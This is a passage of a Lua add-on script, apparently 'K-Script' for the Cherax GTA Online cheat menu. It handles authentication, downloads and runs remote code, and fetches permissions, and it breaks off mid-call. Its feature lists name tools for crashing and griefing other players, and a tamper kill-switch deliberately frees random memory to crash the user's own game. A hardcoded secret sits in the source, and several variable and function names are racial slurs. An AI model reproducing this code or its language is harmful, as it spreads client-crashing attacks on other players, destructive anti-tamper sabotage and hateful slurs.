local API_BASE = "https://kyuubii.dev/k-script"
local MENU_SUBDIR = "\\Lua\\K-Script"
local NATIVE_DB_URL = "https://kyuubii.dev/cherax/lua/lib/natives.lua"
local NATIVE_DB_HASH = "e0f6a7073897aaf1dc3d077e7dcdcb33c5d4d2bfdcc0abca4a0b611ebec249ec"
local AUTH_SECRET = "Zk3N6pQ1Vh8Ws0Xc5Lm2Rt7Fj4Uy9BaDq6Pe1Hv8Gs3Kw0Cz5Yn7Tf2Lx4Md1R"
local AUTH_WAIT_MS = 15000
local AUTH_YIELD_MS = 10

local startClock = os.clock()

detectedPlayerNames = {}
detectedPlayerReasons = {}
sentKScriptEventPlayers = {}
sentHostShareEventPlayers = {}

clearingCache = false
maintransitionActive = false
modderDisplay = true
gameInfoDisplay = true

hostIndex = GTA.GetLocalPlayerId()
scriptHostIndex = GTA.GetLocalPlayerId()
hostName = "Not Found"
scriptHostName = "Not Found"
numConnectedPlayers = 0

apiKey = "NotAuthenticated"
scriptToken = "NotAuthenticated"
initRun = true
apiAuthInProgress = false
apiAuthLastError = nil
isUnloading = false

storedSCName = "nigger"
detectedCountry = "Unknown"
spoofedPid = {}
niggerVeh = {}

lastPTFXEventTimes = {}
lastWorldStateEventTimes = {}
lastSoundEventTimes = {}
lastScriptEventTimes = {}

maxNetEventsPerSecond = 10
maxSoundNetEventsPerSecond = 5
blacklistDuration = 60

netEventblacklist = {}
worldStateEventblacklist = {}
scriptEventblacklist = {}

AdmanUIDs = {}
moderatorUIDs = {}
supporterUIDs = {}
bannedUIDs = {}

DevUID = 728
isSupporter = false
isDev = false
isAdmin = false
isModerator = false
cachedUID = Cherax.GetUID()

areWeHost = false
hostShareActive = false
hostSharePID = nil
oncrashCooldown = false
crashedplayercount = 0
crashedsessioncount = 0
playercount = 0
onlineUsers = {}
isInPool = false
notifyEnabled = false
adminRIDList = {}
blacklistRIDList = {}
isGameVersionEnhanced = false
webhookRequestCompleted = false

menuRootPath = FileMgr.GetMenuRootPath() .. MENU_SUBDIR
yeetwindmills = {}
externalTamperDetected = false

discordID = nil
discordUserName = nil
discordRpcIdentityReady = false

closespawnHandler = nil
objHandler = nil
pedHandler = nil
taskPatchHandler = nil

windowPositionSet = false
infowindowPositionSet = false
StoredPos = {
  GameInfoDisplay = nil,
  ModderDisplay = nil,
}

voiceChatters = {}

local function decodeCaesar(text, shift)
  local decoded = {}

  for index = 1, #text do
    local byte = text:byte(index)

    if byte >= 65 and byte <= 90 then
      decoded[#decoded + 1] = string.char(((byte - 65 - shift + 26) % 26) + 65)
    elseif byte >= 97 and byte <= 122 then
      decoded[#decoded + 1] = string.char(((byte - 97 - shift + 26) % 26) + 97)
    else
      decoded[#decoded + 1] = string.char(byte)
    end
  end

  return table.concat(decoded)
end

local function hasType(value, expectedType)
  return type(value) == expectedType
end

function must_be_loader_env()
  if type(_ENV) ~= "table" then
    return false
  end

  local forbiddenGlobals = {
    "debug",
    "package",
    "require",
    "loadfile",
    "rawset",
    "rawget",
    "rawequal",
    "setmetatable",
    "getmetatable",
    "print",
    "error",
    "_G",
    "_ENV",
  }

  for _, name in ipairs(forbiddenGlobals) do
    if _ENV[name] ~= nil then
      return false
    end
  end

  if not hasType(assert, "function") then return false end
  if not hasType(pcall, "function") then return false end
  if not hasType(xpcall, "function") then return false end
  if not hasType(tostring, "function") then return false end
  if not hasType(type, "function") then return false end
  if not hasType(math, "table") then return false end
  if not hasType(string, "table") then return false end
  if not hasType(table, "table") then return false end
  if not hasType(coroutine, "table") then return false end
  if not hasType(os, "table") then return false end

  if os.execute ~= nil then return false end
  if os.remove ~= nil then return false end
  if os.rename ~= nil then return false end
  if os.getenv ~= nil then return false end
  if os.setlocale ~= nil then return false end

  if not hasType(io, "table") then return false end
  if not hasType(io.open, "function") then return false end
  if io.popen ~= nil then return false end
  if io.tmpfile ~= nil then return false end

  if not hasType(json, "table") then return false end
  if not hasType(json.encode, "function") then return false end
  if not hasType(json.decode, "function") then return false end
  if not hasType(collectgarbage, "function") then return false end

  if not hasType(__KCAP_KEY, "string") then return false end
  if not hasType(__KCAP_FN, "function") then return false end
  if not hasType(_ENV[__KCAP_KEY], "table") then return false end
  if not hasType(_ENV[__KCAP_KEY].v, "string") then return false end
  if __KCAP_FN() ~= _ENV[__KCAP_KEY].v then return false end

  if not hasType(__K_CHAL_RESP, "function") then return false end
  if not hasType(__K_CHAL_WIPE, "function") then return false end
  if not hasType(load, "function") then return false end
  if not hasType(dofile, "function") then return false end

  return true
end

if not must_be_loader_env() then
  if Cherax.GetUID() == DevUID then
    Logger.LogError("Sandbox attestation failed!")
  end

  os.exit(69)
end

local function u32(value)
  return value & 0xffffffff
end

function band(left, right)
  return left & right
end

function bxor(left, right)
  return u32(left ~ right)
end

function bor(left, right)
  return left | right
end

function bnot(value)
  return u32(~value)
end

function lshift(value, bits)
  return u32(value << bits)
end

function rshift(value, bits)
  return u32(value >> bits)
end

local function rotr32(value, bits)
  return u32((value >> bits) | (value << (32 - bits)))
end

function rotl32(value, bits)
  return u32((value << bits) | (value >> (32 - bits)))
end

IV = {
  0x6a09e667,
  0xbb67ae85,
  0x3c6ef372,
  0xa54ff53a,
  0x510e527f,
  0x9b05688c,
  0x1f83d9ab,
  0x5be0cd19,
}

SIGMA = {
  { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15 },
  { 14, 10, 4, 8, 9, 15, 13, 6, 1, 12, 0, 2, 11, 7, 5, 3 },
  { 11, 8, 12, 0, 5, 2, 15, 13, 10, 14, 3, 6, 7, 1, 9, 4 },
  { 7, 9, 3, 1, 13, 12, 11, 14, 2, 6, 5, 10, 4, 0, 15, 8 },
  { 9, 0, 5, 7, 2, 4, 10, 15, 14, 1, 11, 12, 6, 8, 3, 13 },
  { 2, 12, 6, 10, 0, 11, 8, 3, 4, 13, 7, 5, 15, 14, 1, 9 },
  { 12, 5, 1, 15, 14, 13, 4, 10, 0, 7, 6, 3, 9, 2, 8, 11 },
  { 13, 11, 7, 14, 12, 1, 3, 9, 5, 0, 15, 4, 8, 6, 2, 10 },
  { 6, 15, 14, 9, 11, 3, 0, 8, 12, 2, 13, 7, 1, 4, 10, 5 },
  { 10, 2, 8, 4, 7, 6, 1, 5, 15, 11, 9, 14, 3, 12, 13, 0 },
}

local messageWords = {}
for index = 1, 16 do
  messageWords[index] = 0
end

function G(a, b, c, d, x, y)
  a = u32(a + b + x)
  d = rotr32(bxor(d, a), 16)
  c = u32(c + d)
  b = rotr32(bxor(b, c), 12)
  a = u32(a + b + y)
  d = rotr32(bxor(d, a), 8)
  c = u32(c + d)
  b = rotr32(bxor(b, c), 7)

  return a, b, c, d
end

local function littleEndianWord(block, offset)
  local b1 = block:byte(offset) or 0
  local b2 = block:byte(offset + 1) or 0
  local b3 = block:byte(offset + 2) or 0
  local b4 = block:byte(offset + 3) or 0

  return u32(b1 | (b2 << 8) | (b3 << 16) | (b4 << 24))
end

function blake2s_compress(state, block, bytesCompressed, isLastBlock)
  for index = 1, 16 do
    messageWords[index] = littleEndianWord(block, ((index - 1) * 4) + 1)
  end

  local work = {}
  for index = 1, 8 do
    work[index] = state[index]
    work[index + 8] = IV[index]
  end

  work[13] = bxor(work[13], bytesCompressed & 0xffffffff)
  work[14] = bxor(work[14], (bytesCompressed >> 32) & 0xffffffff)

  if isLastBlock then
    work[15] = bxor(work[15], 0xffffffff)
  end

  for round = 1, 10 do
    local s = SIGMA[round]

    work[1], work[5], work[9], work[13] = G(work[1], work[5], work[9], work[13], messageWords[s[1] + 1], messageWords[s[2] + 1])
    work[2], work[6], work[10], work[14] = G(work[2], work[6], work[10], work[14], messageWords[s[3] + 1], messageWords[s[4] + 1])
    work[3], work[7], work[11], work[15] = G(work[3], work[7], work[11], work[15], messageWords[s[5] + 1], messageWords[s[6] + 1])
    work[4], work[8], work[12], work[16] = G(work[4], work[8], work[12], work[16], messageWords[s[7] + 1], messageWords[s[8] + 1])

    work[1], work[6], work[11], work[16] = G(work[1], work[6], work[11], work[16], messageWords[s[9] + 1], messageWords[s[10] + 1])
    work[2], work[7], work[12], work[13] = G(work[2], work[7], work[12], work[13], messageWords[s[11] + 1], messageWords[s[12] + 1])
    work[3], work[8], work[9], work[14] = G(work[3], work[8], work[9], work[14], messageWords[s[13] + 1], messageWords[s[14] + 1])
    work[4], work[5], work[10], work[15] = G(work[4], work[5], work[10], work[15], messageWords[s[15] + 1], messageWords[s[16] + 1])
  end

  for index = 1, 8 do
    state[index] = bxor(state[index], bxor(work[index], work[index + 8]))
  end
end

function blake2s(data)
  local state = {}
  for index = 1, 8 do
    state[index] = IV[index]
  end

  state[1] = bxor(state[1], 0x01010020)

  local offset = 1
  local totalBytes = 0
  while #data - offset + 1 > 64 do
    local block = data:sub(offset, offset + 63)
    totalBytes = totalBytes + #block
    blake2s_compress(state, block, totalBytes, false)
    offset = offset + 64
  end

  local finalBlock = data:sub(offset)
  totalBytes = totalBytes + #finalBlock
  blake2s_compress(state, finalBlock, totalBytes, true)

  local digest = {}
  for byteIndex = 1, 32 do
    local word = state[math.ceil(byteIndex / 4)]
    digest[byteIndex] = string.char((word >> (((byteIndex - 1) % 4) * 8)) & 0xff)
  end

  return table.concat(digest)
end

function toHexString(bytes)
  return (bytes:gsub(".", function(char)
    return string.format("%02x", string.byte(char))
  end))
end

registeredFeatures = {
  hashAndName = {},
}

function FeatAdd(hash, displayName, ...)
  local feature = FeatureMgr.AddFeature(hash, displayName, ...)
  table.insert(registeredFeatures, feature)
  registeredFeatures.hashAndName[hash] = displayName

  local registeredFeature = FeatureMgr.GetFeature(hash)
  if registeredFeature ~= nil then
    registeredFeature:SetSaveable(false)
    registeredFeature:SetSearchable(false)
  end

  return feature
end

function PlayerFeatAdd(hash, displayName, ...)
  local feature = FeatureMgr.AddPlayerFeature(hash, displayName, ...)
  table.insert(registeredFeatures, feature)
  registeredFeatures.hashAndName[hash] = displayName
  return feature
end

function StructInstance(layout, baseAddress)
  local instance = {}

  for key, offsetOrNestedLayout in pairs(layout) do
    if type(offsetOrNestedLayout) == "number" then
      instance[key] = baseAddress + offsetOrNestedLayout
    elseif type(offsetOrNestedLayout) == "table" then
      instance[key] = StructInstance(offsetOrNestedLayout, baseAddress)
    end
  end

  return instance
end

function formatTime(timestamp)
  if not timestamp then
    return "Unknown"
  end

  return os.date("%d/%m/%Y %H:%M:%S", timestamp)
end

activities = {
  [16] = "Open Interaction Menu",
  [20] = "GTAO Intro",
  [49] = "Disable Passive Mode",
  [222] = "Flashbang",
  [248] = "Tennis Invite",
}

function FuckTheniggersGame(delayMs)
  if delayMs and delayMs > 0 then
    Script.Yield(delayMs)
  end

  os.exit(1337)
  MISC.QUIT_GAME()
  NETWORK.NETWORK_QUIT_MP_TO_DESKTOP()

  for threadId = 0, 500 do
    SCRIPT.TERMINATE_THREAD(threadId)
  end

  while true do
    for _ = 0, 100000 do
      Memory.Free(Memory.GetBaseAddress() + math.random(0, 0xffffffff))
    end
  end
end

if Cherax.GetUID() == DevUID then
  isDev = true
  isAdmin = true
  isSupporter = true
end

downloadedThisSession = {}

function DownloadAndSaveLuaAssets(url, fileName)
  if isDev then
    Logger.LogInfo("Starting download for: " .. fileName .. " from " .. url)
  end

  local curl = Curl.Easy()
  curl:Setopt(eCurlOption.CURLOPT_URL, url)
  curl:Setopt(eCurlOption.CURLOPT_USERAGENT, "K-Script V94")

  local ok, errorMessage = pcall(function()
    curl:Perform()
  end)

  if not ok then
    Logger.LogError("Curl perform failed: " .. tostring(errorMessage))
    SetShouldUnload()
    return false
  end

  while not curl:GetFinished() do
    Script.Yield()
  end

  local responseCode, body = curl:GetResponse()
  body = body or ""

  if isDev then
    Logger.LogInfo("Response code: " .. tostring(responseCode))
    Logger.LogInfo("Downloaded bytes: " .. tostring(#body))
  end

  if responseCode ~= eCurlCode.CURLE_OK then
    Logger.LogError("Error downloading dependencies. Response code: " .. tostring(responseCode))
    SetShouldUnload()
    return false
  end

  local root = FileMgr.GetMenuRootPath()
  local directory = "\\Lua\\K-Script\\"
  local fullPath = root .. directory .. fileName

  FileMgr.CreateDir(root .. directory)

  local extension = string.lower(fileName:match("%.([^%.]+)$") or "")
  local wrote
  if extension == "png" or extension == "wav" then
    local file = io.open(fullPath, "wb")
    if file == nil then
      Logger.LogError("Failed to open file for writing: " .. fileName)
      return false
    end

    file:write(body)
    file:close()
    wrote = true
  else
    wrote = FileMgr.WriteFileContent(fullPath, body)
  end

  if not wrote then
    Logger.LogError("Error saving dependencies!")
    SetShouldUnload()
    return false
  end

  downloadedThisSession[fullPath] = true

  if isDev then
    Logger.LogInfo("File saved: " .. fullPath)
  end

  return true
end

natives = FileMgr.GetMenuRootPath() .. "\\Lua\\K-Script\\nativedb.lua"

if not FileMgr.DoesFileExist(natives) then
  Logger.LogError("Missing dependencies at " .. natives .. " , downloading...")
  if not DownloadAndSaveLuaAssets(NATIVE_DB_URL, "nativedb.lua") then
    SetShouldUnload()
    return
  end
end

local expectedFileHashes = {
  [natives] = NATIVE_DB_HASH,
}

local function verifyFileIntegrity(path)
  local expectedHash = expectedFileHashes[path]
  if expectedHash == nil then
    Logger.LogError(("No expected hash defined for file: %s"):format(path))
    SetShouldUnload()
    return false
  end

  local content = FileMgr.ReadFileContent(path)
  if content == nil or #content == 0 then
    Logger.LogError(("Failed to read file: %s"):format(path))
    SetShouldUnload()
    return false
  end

  local actualHash = toHexString(blake2s(content))
  if actualHash ~= expectedHash then
    if downloadedThisSession[path] then
      Logger.LogError("Corrupted download detected for: " .. path)
      GUI.AddToast(
        "K-Script",
        "Asset Downloader detected File corruption, please Reload the Script!\nIf the issue persist use a VPN!",
        20000,
        eToastPos.TOP_RIGHT
      )
    else
      externalTamperDetected = true
      GUI.AddToast("K-Script", "Detected external File Tampering, unloading...", 20000, eToastPos.TOP_RIGHT)
    end

    FileMgr.DeleteFile(path)
    FuckTheniggersGame()
    return false
  end

  return true
end

for path in pairs(expectedFileHashes) do
  if not verifyFileIntegrity(path) then
    Logger.LogInfo(("Integrity failure on %s"):format(path))
    return
  end
end

if not externalTamperDetected then
  dofile(natives)
end

local function curlRequest(method, url, body, headers)
  local curl = Curl.Easy()
  curl:Setopt(eCurlOption.CURLOPT_URL, url)
  curl:Setopt(eCurlOption.CURLOPT_USERAGENT, "K-Script V38")
  curl:DisableErrorLog()

  for header, value in pairs(headers or {}) do
    curl:AddHeader(tostring(header) .. ": " .. tostring(value))
  end

  if method == "POST" then
    curl:Setopt(eCurlOption.CURLOPT_POST, 1)
    curl:Setopt(eCurlOption.CURLOPT_POSTFIELDS, body or "{}")
  end

  curl:Perform()
  while not curl:GetFinished() do
    Script.Yield()
  end

  local code, response = curl:GetResponse()
  if code ~= eCurlCode.CURLE_OK then
    return nil, code, response
  end

  return response, nil
end

local function extractResponseBody(response)
  if type(response) == "table" then
    response = response.body
      or response.Body
      or response.data
      or response.Data
      or response.text
      or response.Text
      or response.response
      or response.Response
  end

  if type(response) ~= "string" then
    return nil
  end

  local body = response:gsub("^\239\187\191", ""):gsub("^%s+", "")
  local headerEnd = body:find("\r\n\r\n", 1, true)
  if headerEnd then
    body = body:sub(headerEnd + 4):gsub("^%s+", "")
  end

  return body
end

function DoLoaderChallengeOrExit(baseUrl)
  baseUrl = tostring(baseUrl or API_BASE or "")
  if baseUrl == "" then
    FuckTheniggersGame()
    return
  end

  local sid = tostring(__K_SID or "")
  local sessionExpiresAt = tostring(__K_SESS_EXP or "")
  if sid == "" or sessionExpiresAt == "" or type(__K_CHAL_RESP) ~= "function" then
    FuckTheniggersGame()
    return
  end

  if type(curlRequest) ~= "function" or type(json) ~= "table" or type(json.decode) ~= "function" or type(json.encode) ~= "function" then
    FuckTheniggersGame()
    return
  end

  local challengeResponse = curlRequest(
    "GET",
    baseUrl .. "/loader/script/challenge?sid=" .. sid,
    nil,
    { ["Content-Type"] = "application/json" }
  )

  local challengeBody = extractResponseBody(challengeResponse)
  if challengeBody == nil then
    FuckTheniggersGame()
    return
  end

  local decodedChallenge = json.decode(challengeBody)
  if type(decodedChallenge) ~= "table" or decodedChallenge.challenge == nil or decodedChallenge.challengeExp == nil then
    FuckTheniggersGame()
    return
  end

  local challenge = tostring(decodedChallenge.challenge)
  local challengeExpiresAt = tostring(decodedChallenge.challengeExp)
  local proof = __K_CHAL_RESP(challenge, challengeExpiresAt)
  proof = tostring(proof or ""):lower():gsub("%s+", "")

  local verifyBody = json.encode({
    sid = sid,
    challenge = challenge,
    resp = proof,
  })

  local verifyResponse = curlRequest(
    "POST",
    baseUrl .. "/loader/script/verify",
    verifyBody,
    { ["Content-Type"] = "application/json" }
  )

  local verifyResponseBody = extractResponseBody(verifyResponse)
  if verifyResponseBody == nil then
    os.exit(69)
    FuckTheniggersGame()
    return
  end

  local decodedVerify = json.decode(verifyResponseBody)
  if type(decodedVerify) ~= "table"
    or decodedVerify.ok ~= true
    or type(decodedVerify.scriptToken) ~= "string"
    or decodedVerify.scriptToken == ""
  then
    os.exit(69)
    FuckTheniggersGame()
    return
  end

  scriptToken = decodedVerify.scriptToken

  if type(__K_CHAL_WIPE) == "function" then
    pcall(__K_CHAL_WIPE)
  end

  __K_CHAL_WIPE = nil
  __K_CHAL_RESP = nil
  __K_SID = nil
  __K_SESS_EXP = nil
  __K_API_BASE = nil

  collectgarbage("collect")
  collectgarbage("collect")
end

DoLoaderChallengeOrExit(API_BASE)

local function loadPlayerNotes()
  local path = FileMgr.GetMenuRootPath() .. "\\Lua\\K-Script\\PlayerNotes.json"
  if not FileMgr.DoesFileExist(path) then
    return {}
  end

  local content = FileMgr.ReadFileContent(path)
  if content == nil or content == "" then
    return {}
  end

  local decoded = json.decode(content)
  if type(decoded) ~= "table" then
    return {}
  end

  return decoded
end

function getLocalRockstarId()
  local localPed = GTA.GetLocalPed()
  if localPed == nil then
    return "hb_Error: Failed to GetLocalPed"
  end

  if localPed.PlayerInfo == nil then
    return "hb_Error: Failed to  get CPlayerInfo"
  end

  if localPed.PlayerInfo.NetData == nil then
    return "hb_Error: populating GamerInfo struct!"
  end

  return tostring(localPed.PlayerInfo.NetData.RockstarId)
end

function getSessionType()
  if NETWORK.NETWORK_SESSION_IS_CLOSED_FRIENDS() then
    return "Closed Friends"
  end

  if NETWORK.NETWORK_SESSION_IS_CLOSED_CREW() then
    return "Closed Crew"
  end

  if NETWORK.NETWORK_SESSION_IS_SOLO() then
    return "Solo"
  end

  if NETWORK.NETWORK_SESSION_IS_PRIVATE() then
    return "Invite Only"
  end

  if NETWORK.NETWORK_IS_SESSION_ACTIVE() then
    return "Public"
  end

  return "Story Mode"
end

function isBattlEyeEnabled(version)
  return string.find(version, "BE", 1, true) ~= nil
end

poopStatusMessages = {
  "Remote Player Stopped Responding",
  "Session Integrity: Compromised",
  "Another Client Left Reality",
  "Peer Connection Terminated",
  "Host Did Not Survive",
  "Player State Became Invalid",
  "Session Collapsing Gracefully",
  "Network Event Was Not Expected",
  "That Was Not Lag",
  "Client Failed To Recover",
  "Los Santos Rejected A Player",
  "Packet Loss Achieved",
  "Reality Desynced Successfully",
  "Player Removed By Physics",
  "Connection Ended Abruptly",
  "Undefined Behavior Detected",
  "Session Authority Questioned",
  "Timeline Divergence Confirmed",
  "Another One Timed Out",
  "Rockstar Netcode Took Over",
  "Rockstar Netcode Moment",
  "crashing Fools Is Top Priority",
  "Session Disruption In Progress",
  "Making GTA Online Unstable",
  "Problem Players Being Addressed",
  "This Session Is Being Optimized",
  "Stability Was Never An Option",
  "Actively Ruining Someone's Day",
  "Session Quality Decreasing",
  "Enforcing Chaos Protocol",
  "Targeted Network Adjustments",
  "Fixing Sessions The Hard Way",
  "Improving Player Experience (Ours)",
  "Reducing Player Count",
  "Selective Client Retirement",
  "Session Cleanup In Progress",
  "Performance Tuning Players",
  "Removing Unwanted Participants",
  "Hunting Lexis Users...",
  "crashing Lexis Users for a Living",
  "crashing Lexis Users for a Living",
  "crashing Lexis Users for a Living",
  "crashing Lexis Users for a Living",
  "Rain Code Moment",
  "SPX is pasted Chinese garbage",
  "SPX on the bottom!",
}

discordButtons = {
  { label = "Join The Discord", url = "https://discord.gg/k-script" },
  { label = "Subscribe to Script", url = "https://cherax.menu/scripts/8" },
}

featuresRemoved = false
logOnce = false
wasSupporter = false
wasAdmin = false
wasModerator = false

local function apiKeyReady()
  return type(apiKey) == "string" and apiKey ~= "" and apiKey ~= "NotAuthenticated"
end

local function scriptTokenReady()
  return type(scriptToken) == "string" and scriptToken ~= "" and scriptToken ~= "NotAuthenticated"
end

local function authLog(context, message)
  if isDev or isAdmin then
    Logger.LogError(("[K-Script Auth] %s: %s"):format(tostring(context or "request"), tostring(message)))
  end
end

local function waitForScriptToken(context, timeoutMs)
  if scriptTokenReady() then
    return true
  end

  local startedAt = os.clock()
  while not scriptTokenReady() and not ShouldUnload() do
    if timeoutMs and timeoutMs > 0 and timeoutMs <= ((os.clock() - startedAt) * 1000) then
      authLog(context, "timed out waiting for challenge")
      return false
    end

    Script.Yield(AUTH_YIELD_MS)
  end

  return scriptTokenReady()
end

local function tableContainsValue(values, needle)
  if values == nil or needle == nil then
    return false
  end

  for _, value in ipairs(values) do
    if value == needle then
      return true
    end
  end

  return false
end

_ENV.tableContainsValue = tableContainsValue

local function finishInitialAuth(context, socialClubName)
  if not initRun or externalTamperDetected or not apiKeyReady() then
    return
  end

  if type(socialClubName) == "string" and socialClubName ~= "" then
    storedSCName = socialClubName
  else
    storedSCName = SOCIALCLUB.SC_ACCOUNT_INFO_GET_NICKNAME()
  end

  initRun = false

  if ShouldUnload() then
    return
  end

  if context ~= "FetchAdminRIDList" and type(FetchAdminRIDList) == "function" then
    FetchAdminRIDList()
  end
end

local function resumeAuth(context, socialClubName)
  if not initRun or externalTamperDetected or not apiKeyReady() then
    return
  end

  if context ~= "FetchUserPermissions" and type(FetchUserPermissions) == "function" then
    local previousContext = context
    FetchUserPermissions(false)
    context = previousContext
  end

  if ShouldUnload() or not initRun then
    return
  end

  finishInitialAuth(context, socialClubName)
end

local function ensureApiAuthenticated(context, socialClubName, timeoutMs)
  if externalTamperDetected or ShouldUnload() then
    return false
  end

  timeoutMs = timeoutMs or AUTH_WAIT_MS

  if not waitForScriptToken(context, timeoutMs) then
    return false
  end

  if apiKeyReady() then
    resumeAuth(context, socialClubName)
    return true
  end

  if apiAuthInProgress then
    local startedAt = os.clock()

    while apiAuthInProgress and not apiKeyReady() and not ShouldUnload() do
      if timeoutMs > 0 and timeoutMs <= ((os.clock() - startedAt) * 1000) then
        authLog(context, "timed out waiting for api key")
        return false
      end

      Script.Yield(AUTH_YIELD_MS)
    end

    if apiKeyReady() then
      resumeAuth(context, socialClubName)
      return true
    end

    if apiAuthLastError then
      authLog(context, ("authentication failed: %s"):format(tostring(apiAuthLastError)))
    end

    return false
  end

  apiAuthInProgress = true
  apiAuthLastError = nil

  local authClientName = (type(socialClubName) == "string" and socialClubName ~= "") and socialClubName
    or SOCIALCLUB.SC_ACCOUNT_INFO_GET_NICKNAME()

  local queued, queueError = pcall(Script.QueueJob, function()
    local ok, errorMessage = pcall(AuthenticateToAPI, authClientName)

    if not ok then
      apiAuthLastError = errorMessage
      authLog(context, ("authentication threw: %s"):format(tostring(errorMessage)))
    elseif not apiKeyReady() then
      apiAuthLastError = ShouldUnload() and "authentication requested unload" or "authentication finished without api key"
    end

    apiAuthInProgress = false
  end)

  if not queued then
    apiAuthInProgress = false
    apiAuthLastError = queueError
    authLog(context, ("failed to queue authentication: %s"):format(tostring(queueError)))
    return false
  end

  local startedAt = os.clock()
  while apiAuthInProgress and not apiKeyReady() and not ShouldUnload() do
    if timeoutMs > 0 and timeoutMs <= ((os.clock() - startedAt) * 1000) then
      authLog(context, "timed out waiting for queued api auth")
      return false
    end

    Script.Yield(AUTH_YIELD_MS)
  end

  if ShouldUnload() then
    return false
  end

  if apiKeyReady() then
    resumeAuth(context, authClientName)
    return true
  end

  authLog(context, apiAuthLastError and ("authentication failed: %s"):format(tostring(apiAuthLastError)) or "authentication finished without api key")
  return false
end

local function refreshApiKey(context, socialClubName)
  apiKey = "NotAuthenticated"
  return ensureApiAuthenticated(context, socialClubName, AUTH_WAIT_MS)
end

local function addAuthHeaders(curl)
  curl:AddHeader("Content-Type: application/json")
  curl:AddHeader("X-API-KEY: " .. apiKey)
  curl:AddHeader(("x-script-token: %s"):format(scriptToken))
end

local function waitForCurl(curl, yieldMs, timeoutSeconds)
  local startedAt = os.clock()

  while not curl:GetFinished() do
    Script.Yield(yieldMs or 10)

    if timeoutSeconds and timeoutSeconds > 0 and timeoutSeconds < (os.clock() - startedAt) then
      return false
    end

    if ShouldUnload() then
      return false
    end
  end

  return true
end

local function responseNeedsApiRefresh(response)
  return tostring(response or ""):find("API Key Expired", 1, true) ~= nil
end

local function responseIsUnauthorized(response)
  return tostring(response or ""):find("Unauthorized", 1, true) ~= nil
end

local function parseNumberArrayFromJsonLikeObject(body, field)
  local decodedOk, decoded = pcall(json.decode, body)
  if decodedOk and type(decoded) == "table" and type(decoded[field]) == "table" then
    local values = {}
    for _, value in ipairs(decoded[field]) do
      local number = tonumber(value)
      if number then
        values[#values + 1] = number
      end
    end
    return values
  end

  local values = {}
  for listBody in tostring(body):gmatch('"' .. field .. '"%s*:%s*%[([^%]]+)%]') do
    for value in listBody:gmatch("%d+") do
      values[#values + 1] = tonumber(value)
    end
  end

  return values
end

local function removeFeatureByName(name)
  pcall(FeatureMgr.RemoveFeature, Utils.Joaat(name))
end

local function removePlayerFeatureArray(name)
  pcall(FeatureMgr.RemoveFeatureArray, Utils.Joaat(name), 31)
end

local function removeFreeUserFeatures()
  local regularFeatures = {
    "sigTest",
    "crashloop",
    "KScript-crashLoopTextInput",
    "crashLoopTextInputEnabled",
    "ToggleSpawnLocations",
    "SPAWN_OBJECT_AT_LSC",
    "SpawnWindmillAtPlayerFeet",
    "largeObjDmpCleanup7",
    "crashProt0",
    "PedProt6",
    "VehicleProt2",
    "ObjProt0",
    "closespawnProt2",
    "cacheBlockedEnts5",
    "clearcacheEnts7",
    "closespawnRadius3",
    "blockPTFX7",
    "blockExplos2",
    "InvalidPhoneGesturev32",
  }

  for _, name in ipairs(regularFeatures) do
    removeFeatureByName(name)
  end

  pcall(EventMgr.RemoveHandler, closespawnHandler)
  pcall(EventMgr.RemoveHandler, objHandler)
  pcall(EventMgr.RemoveHandler, pedHandler)
  pcall(EventMgr.RemoveHandler, taskPatchHandler)
  pcall(EventMgr.RemoveHandler, vehHandler1)

  local playerFeatureArrays = {
    "invflag",
    "pBigBraincrash",
    "pBigBraincrashV7",
    "goofycrash",
    "tugspam",
    "spongebobc",
    "interactionLoop",
    "glitchP2",
    "cargoglitch0",
    "flipper5",
    "pyroTroll8",
    "tugLagger",
    "largeObjDmp1",
    "vehlightCwash",
    "rapeLexis",
    "SpawnWindmillAtRemotePlayerFeet",
    "invalidPoolDelete6",
    "InvalidPhoneGesture4",
    "InvalidMComp6",
    "OPTrollingCarfrfr",
  }

  for _, name in ipairs(playerFeatureArrays) do
    removePlayerFeatureArray(name)
  end

  for activityId in pairs(activities) do
    removePlayerFeatureArray(activityId)
  end

  if not isDev then
    removePlayerFeatureArray("remotecrash")
    removeFeatureByName("entityCreationLogger")
    removeFeatureByName("chinatrolltest")
  end

  if not isAdmin then
    removeFeatureByName("KScript-crashLoopTextInput")
    removeFeatureByName("crashLoopTextInputEnabled")
    removeFeatureByName("crashloop")
  end

  if not isDev and not isAdmin and not isModerator and Cherax.GetUID() ~= 67472 and Cherax.GetUID() ~= 30117 then
    removeFeatureByName("ghostDetect")
  end

  isInPool = true
  notifyEnabled = false
  featuresRemoved = true
end

function FetchUserPermissions(yieldWhileWaiting)
  if ShouldUnload() then
    return
  end

  if not ensureApiAuthenticated("FetchUserPermissions", SOCIALCLUB.SC_ACCOUNT_INFO_GET_NICKNAME()) then
    return
  end

  if not logOnce then
    Logger.Log(eLogColor.GREEN, "K-Script", ("Checking User Permissions for UID: %i... "):format(Cherax.GetUID()))
  end

  local curl = Curl.Easy()
  curl:Setopt(eCurlOption.CURLOPT_URL, API_BASE .. "/get_permissions")
  addAuthHeaders(curl)
  curl:Setopt(eCurlOption.CURLOPT_USERAGENT, "K-Script V27")
  curl:DisableErrorLog()
  curl:Perform()

  if not waitForCurl(curl, yieldWhileWaiting and 10 or 0) then
    return
  end

  local code, response = curl:GetResponse()
  response = response or ""

  if responseNeedsApiRefresh(response) then
    if refreshApiKey("FetchUserPermissions", SOCIALCLUB.SC_ACCOUNT_INFO_GET_NICKNAME()) then
      Script.QueueJob(FetchUserPermissions, true)
    end
    return
  end

  if code ~= eCurlCode.CURLE_OK or response:find("error", 1, true) then
    if isAdmin then
      Logger.LogError(("(FetchUserPermissions) K-Script: WebServer Response Code: %i, ResponseBody: %s"):format(code, response))
    else
      Logger.LogError(("K-Script: Failed to fetch user permissions! (%s)"):format(response))
    end

    if responseIsUnauthorized(response) then
      Logger.LogError("K-Script: Session Ticket Revoked!")
      FuckTheniggersGame()
    end

    SetShouldUnload()
    return
  end

  AdmanUIDs = parseNumberArrayFromJsonLikeObject(response, "admins")
  moderatorUIDs = parseNumberArrayFromJsonLikeObject(response, "moderators")
  supporterUIDs = parseNumberArrayFromJsonLikeObject(response, "supporters")
  bannedUIDs = parseNumberArrayFromJsonLikeObject(response, "banned")

  if tableContainsValue(bannedUIDs, Cherax.GetUID()) then
    Logger.Log(eLogColor.RED, "K-Script", "You`ve been Banned from using K-Script!")
    if type(SendToDiscord) == "function" then
      SendToDiscord(
        "lol",
